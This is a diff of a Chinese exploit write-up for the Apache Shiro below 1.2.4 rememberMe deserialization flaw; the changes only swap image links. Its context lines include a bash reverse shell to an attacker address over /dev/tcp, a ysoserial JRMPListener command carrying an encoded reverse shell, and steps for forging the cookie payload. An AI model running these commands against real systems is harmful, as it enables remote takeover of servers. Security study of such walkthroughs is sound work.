@@ -28,7 +28,7 @@ Apache Shiro < 1.2.4
 
 #### 系统界面如图
 
-<img src="https://image.geoer.cn/shiro1.jpg"></img>
+<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/shiro1.jpg"></img>
 
 
 
@@ -36,7 +36,7 @@ Apache Shiro < 1.2.4
 
 可以看到是Shiro
 
-<img src="https://image.geoer.cn/shiro2.jpg"></img>
+<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/shiro2.jpg"></img>
 
 #### 1.检查是否存在默认的key
 
@@ -58,7 +58,7 @@ python shiro_exploit.py -u http://<IP>:7080
 nc -lvvp 7788
 ```
 
-<img src="https://image.geoer.cn/shiro3.jpg"></img>
+<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/shiro3.jpg"></img>
 
 2.2 Java Runtime 配合 bash 编码，
 在线编码地址：http://www.jackson-t.ca/runtime-exec-payloads.html
@@ -67,7 +67,7 @@ nc -lvvp 7788
 bash -i >& /dev/tcp/202.xx.xx.xx/7788 0>&1	# ip为攻击机的地址
 ```
 
-<img src="https://image.geoer.cn/shiro4.jpg"></img>
+<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/shiro4.jpg"></img>
 
 #### 3.通过ysoserial中JRMP监听模块，监听6666端口并执行反弹shell命令
 
@@ -77,7 +77,7 @@ bash -i >& /dev/tcp/202.xx.xx.xx/7788 0>&1	# ip为攻击机的地址
 java -cp ysoserial.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections6 'bash -c {echo,YmFzaCAtxxxxxxzYuxxxxxxxxxxxxQ==}|{base64,-d}|{bash,-i}'	# 这里用的CommonsCollections4
 ```
 
-<img src="https://image.geoer.cn/shiro5.jpg"></img>
+<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/shiro5.jpg"></img>
 
 #### 4.使用shiro.py 生成Payload
 
@@ -85,7 +85,7 @@ java -cp ysoserial.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections6 '
 python shiro.py 122.xx.xx.xx:6666
 ```
 
-<img src="https://image.geoer.cn/shiro6.jpg"></img>
+<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/shiro6.jpg"></img>
 
 其中shiro.py代码如下：
 
@@ -117,11 +117,11 @@ print "rememberMe={0}".format(payload.decode())
 
 #### 5.构造数据包，伪造cookie，发送Payload.
 
-<img src="https://image.geoer.cn/shiro7.jpg"></img>
+<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/shiro7.jpg"></img>
 
 #### 6.nc监听端口，shell成功反弹
 
-<img src="https://image.geoer.cn/shiro8.jpg"></img>
+<img src="https://geoer666-1257264766.cos.ap-beijing.myqcloud.com/shiro8.jpg"></img>
 
 ------
 
